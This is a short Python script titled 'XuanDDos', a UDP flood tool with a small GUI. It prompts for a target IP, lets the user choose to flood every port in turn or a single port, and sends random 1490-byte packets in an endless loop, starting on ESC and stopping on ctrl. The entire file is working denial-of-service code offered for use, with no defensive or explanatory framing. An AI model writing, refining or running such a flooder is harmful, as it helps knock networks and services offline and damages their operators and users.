import sys
import os
import time
import socket
import random
import keyboard
import easygui
print("XuanDDos")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
ip = easygui.enterbox("Target IP:")
while True:
    ModeChoose = easygui.choicebox("Choose how you want to attack","ChooseAttackMode",["Full-port attacks","Fixed port attacks"])
    if ModeChoose == "Full-port attacks":
        AttackMode = "AllPort"
        break
    elif ModeChoose == "Fixed port attacks":
        AttackMode = "OnePort"
        OP = int(easygui.enterbox("Please enter the port you want to attack:","Select a port"))
        OPstr = str(OP)
        break
port = 1
sent = 0
easygui.msgbox("Click OK and press the ESC key to start DDos, and press the ctrl key to stop DDos")
keyboard.wait("esc")
if AttackMode == "AllPort":
    while True:
        sock.sendto(bytes,(ip,port))
        sent = sent + 1
        SentStr = str(sent)
        port = port + 1
        PortStr = str(port-1)
        print(SentStr+" attack on"+ip+",the current attack port:"+PortStr)
        if port == 65534:
             port = 1
        if keyboard.is_pressed("ctrl") == True:
            break
elif AttackMode == "OnePort":
    while True:
        sock.sendto(bytes,(ip,OP))
        sent = sent + 1
        SentStr = str(sent)
        print(SentStr+" attack on"+ip+",the current attack port:"+OPstr)
        if keyboard.is_pressed("ctrl") == True:
            break
easygui.msgbox("DDos has been stopped")
